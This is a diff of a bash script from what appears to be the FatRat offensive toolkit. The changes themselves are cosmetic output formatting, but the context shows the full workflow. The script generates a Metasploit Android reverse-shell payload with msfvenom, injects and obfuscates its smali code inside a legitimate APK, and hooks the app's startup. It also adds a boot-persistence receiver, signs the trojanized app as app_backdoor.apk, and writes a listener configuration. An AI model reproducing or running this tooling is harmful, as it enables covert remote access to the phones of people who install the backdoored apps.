@@ -95,10 +95,12 @@ function hook_smali_file {
     sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$1"'\/'"$2"'\/'"$3"'\/a;->a(Landroid\/content\/Context;)V' $smali_file >>$LOG_FILE 2>&1
     grep -B 2 "$1/$2/$3/a" $smali_file >>$LOG_FILE 2>&1
     if [ $? == 0 ]; then
+      echo -e $green ""
       echo "The smali file was hooked successfully" >>$LOG_FILE 2>&1
       FUNC_RESULT=$smali_file
       return 0
     else
+      echo -e $red ""
       echo "Failed to hook smali file" >>$LOG_FILE 2>&1
       local super_android_class=`grep ".super" $smali_file |sed 's/.super L//g' |sed 's/;//g'`
       if [ -z $super_android_class ]; then
@@ -122,11 +124,13 @@ function hook_smali_file {
 
 function verify_orig_apk {
   if [ -z $MY_PATH/temp/$ORIG_APK_FILE ]; then
+    echo -e $red ""
     echo "[!] No original APK file specified"
     exit 1
   fi
 
   if [ ! -f $MY_PATH/temp/$ORIG_APK_FILE ]; then
+    echo -e $red ""
     echo "[!] Original APK file specified does not exist"
     exit 1
   fi
@@ -134,6 +138,7 @@ function verify_orig_apk {
   $UNZIP -l $MY_PATH/temp/$ORIG_APK_FILE >>$LOG_FILE 2>&1
   rc=$?
   if [ $rc != 0 ]; then
+    echo -e $red ""
     echo "[!] Original APK file specified is not valid"
     exit $rc
   fi
@@ -143,6 +148,7 @@ function consult_which {
   which $1 >>$LOG_FILE 2>&1
   rc=$?
   if [ $rc != 0 ]; then
+    echo -e $red ""
     echo "[!] Check your environment and configuration. Couldn't find: $1"
     exit $rc
   fi
@@ -165,8 +171,8 @@ function init {
 
 # kick things off
 init
-
-echo -e $green "[*] Creating RAT Apk File "
+echo -e $green ""
+echo -ne "[*] Creating RAT Apk File..."
 $MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -174,8 +180,8 @@ if [ $rc != 0 ] || [ ! -f $MY_PATH/temp/$RAT_APK_FILE ]; then
   echo -e $red "[!] Failed to generate RAT APK file"
   exit 1
 fi
-
-echo -e $green "[*] Decompiling RAT APK file..."
+echo -e $green ""
+echo -ne "[*] Decompiling RAT APK file..."
 $APKTOOL d -f -o $MY_PATH/temp/payload $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -183,8 +189,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to decompile RAT APK file"
   exit $rc
 fi
-
-echo -e $green "[*] Decompiling original APK file..."
+echo -e $green ""
+echo -ne "[*] Decompiling original APK file..."
 $APKTOOL d -f -o $MY_PATH/temp/original $MY_PATH/temp/$ORIG_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -192,8 +198,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to decompile original APK file"
   exit $rc
 fi
-
-echo -e $green "[*] Merging permissions of original and payload projects..."
+echo -e $green ""
+echo -ne "[*] Merging permissions of original and payload projects..."
 # build random hex placeholder value without openssl
 placeholder=''
 for i in `seq 1 4`; do
@@ -223,7 +229,8 @@ echo "done."
 
 # use dex2jar, proguard, and dx
 # to shrink, optimize, and obfuscate original Rat.apk code
-echo -e $green "[*] Running proguard on RAT APK file..."
+echo -e $green ""
+echo -ne "[*] Running proguard on RAT APK file..."
 mkdir -v -p $MY_PATH/temp/bin/classes >>$LOG_FILE 2>&1
 mkdir -v -p $MY_PATH/temp/libs >>$LOG_FILE 2>&1
 mv $MY_PATH/temp/$RAT_APK_FILE $MY_PATH/temp/bin/classes >>$LOG_FILE 2>&1
@@ -261,8 +268,8 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 echo "done."
-
-echo -e $green "[*] Decompiling obfuscated RAT APK file..."
+echo -e $green ""
+echo -ne "[*] Decompiling obfuscated RAT APK file..."
 $APKTOOL d -f -o $MY_PATH/temp/payload $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -283,8 +290,8 @@ echo "payload_primary_dir is: $payload_primary_dir" >>$LOG_FILE 2>&1
 namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
 payload_sub_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
 echo "payload_sub_dir is: $payload_sub_dir" >>$LOG_FILE 2>&1
-
-echo -e $green "[*] Creating new directories in original project for RAT smali files..."
+echo -e $green ""
+echo -ne "[*] Creating new directories in original project for RAT smali files..."
 mkdir -v -p $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -292,8 +299,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to create new directories for RAT smali files"
   exit $rc
 fi
-
-echo -e $green "[*] Copying RAT smali files to new directories in original project..."
+echo -e $green ""
+echo -ne "[*] Copying RAT smali files to new directories in original project..."
 cp -v $MY_PATH/temp/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
@@ -309,8 +316,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to copy RAT smali files"
   exit $rc
 fi
-
-echo -e $green "[*] Fixing RAT smali files..."
+echo -e $green ""
+echo -ne "[*] Fixing RAT smali files..."
 sed -i 's/MainBroadcastReceiver/AppBoot/g' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
@@ -326,8 +333,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to fix RAT smali files"
   exit $rc
 fi
-
-echo -e $green "[*] Obfuscating const-string values in RAT smali files..."
+echo -e $green ""
+echo -ne "[*] Obfuscating const-string values in RAT smali files..."
 cat >$MY_PATH/temp/obfuscate.method <<EOL
 
     invoke-static {###REG###}, L###CLASS###;->b(Ljava/lang/String;)Ljava/lang/String;
@@ -418,8 +425,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to obfuscate const-string values in RAT smali files"
   exit $rc
 fi
-
-echo -e $green "[*] Locating smali file to hook in original project..."
+echo -e $green ""
+echo -ne "[*] Locating smali file to hook in original project..."
 total_package=`head -n 2 $MY_PATH/temp/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $MY_PATH/temp/original/AndroidManifest.xml |awk -F ":" '{ print $1 }'`
 echo "Found launcher line in manifest file: $launcher_line_num" >>$LOG_FILE 2>&1
@@ -456,8 +463,8 @@ else
   smali_file_to_hook=$FUNC_RESULT
   echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
 fi
-
-echo -e $green "[*] Adding hook in original smali file..."
+echo -e $green ""
+echo -ne "[*] Adding hook in original smali file..."
 hook_smali_file $payload_tld $payload_primary_dir $payload_sub_dir $smali_file_to_hook
 rc=$?
 echo "done."
@@ -465,8 +472,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to add hook"
   exit $rc
 fi
-
-echo -e $green "[*] Adding persistence hook in original project..."
+echo -e $green ""
+echo -ne "[*] Adding persistence hook in original project..."
 cat >$MY_PATH/temp/persistence.hook <<EOL
         <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
             <intent-filter>
@@ -490,8 +497,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to add persistence hook"
   exit $rc
 fi
-
-echo -e $green "[*] Recompiling original project with backdoor..."
+echo -e $green ""
+echo -ne "[*] Recompiling original project with backdoor..."
 $APKTOOL b $MY_PATH/temp/original >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -525,8 +532,8 @@ end_ts=$(TZ=UTC date -ud "$to_date_norm" +'%s')
 start_ts=$(TZ=UTC date -ud "$from_date_norm" +'%s')
 validity=$(( ( (${end_ts} - ${start_ts}) / (60*60*24) ) ))
 echo "Value of validity: $validity" >>$LOG_FILE 2>&1
-
-echo -n "[*] Generating RSA key for signing..."
+echo -e $green ""
+echo -ne "[*] Generating RSA key for signing..."
 $KEYTOOL -genkey -noprompt -alias signing.key -startdate "$from_date_str" -validity $validity -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
@@ -539,8 +546,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to generate RSA key"
   exit $rc
 fi
-
-echo -e $green "[*] Signing recompiled APK..."
+echo -e $green ""
+echo -ne "[*] Signing recompiled APK..."
 $JARSIGNER -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -548,8 +555,8 @@ if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to sign recompiled APK"
   exit $rc
 fi
-
-echo -e $green "[*] Verifying signed artifacts..."
+echo -e $green ""
+echo -ne "[*] Verifying signed artifacts..."
 $JARSIGNER -verify -certs $compiled_apk >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -559,8 +566,8 @@ if [ $rc != 0 ]; then
 fi
 
 mv $compiled_apk $unaligned_apk
-
-echo -e $green "[*] Aligning recompiled APK..."
+echo -e $green ""
+echo -ne "[*] Aligning recompiled APK..."
 $ZIPALIGN 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
@@ -570,11 +577,13 @@ if [ $rc != 0 ]; then
 fi
 
 rm $unaligned_apk
+
 #Checking finished apk file
 fiapk=$MY_PATH/temp/original/dist/app.apk
 if [ -f "$fiapk" ]
 then
-echo -e $green "[*] Backdoor apk created sucefully"
+echo -e $green ""
+echo -ne "[*] Backdoor apk created sucefully"
 else
 echo -e $red "There was a problem in the creation of your Rat apk file ,
 check $MY_PATH/logs/apk.log for more information about the error ."
@@ -588,19 +597,23 @@ back=$MY_PATH/backdoored/app_backdoor.apk
 if [ -f "$back" ]
 then
 mv $MY_PATH/backdoored/app_backdoor.apk $MY_PATH/backdoored/app_backdoor_$ren.apk
-echo -e $yellow "FatRat Detected that you already had a previous created backdoor
+echo -e $yellow ""
+echo "FatRat Detected that you already had a previous created backdoor
 file in ($MY_PATH/backdoored/) with the name app_backdoor.apk ."
-echo -e $blue "FatRat have renamed your old backdoor to app_backdoor$ren.apk"
+echo -e $blue ""
+echo "FatRat have renamed your old backdoor to app_backdoor$ren.apk"
 
 #Moving finished backdoor file to final destination
 mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
-echo -ne $green" Your RAT apk was successfully builded and signed , it is located here :
+echo -e $green ""
+echo "Your RAT apk was successfully builded and signed , it is located here :
  $MY_PATH/backdoored/app_backdoor.apk"
 rm -rf temp/* > /dev/null 2>&1
 echo ""
 else
 mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
-echo -ne $green" Your RAT apk was successfully builded and signed , it is located here :
+echo -e $green ""
+echo "Your RAT apk was successfully builded and signed , it is located here :
  $MY_PATH/backdoored/app_backdoor.apk"
 rm -rf temp/* > /dev/null 2>&1
 echo ""
@@ -618,5 +631,6 @@ echo "set PAYLOAD $payloads" >> $svf
 echo "set LHOST $yourip" >> $svf
 echo "set LPORT $yourport" >> $svf
 echo "exploit -j" >> $svf
-echo -e okegreen "Configuration file saved to $list/$save.rc"
+echo -e $blue ""
+echo "Configuration file saved to $list/$save.rc"
 fi
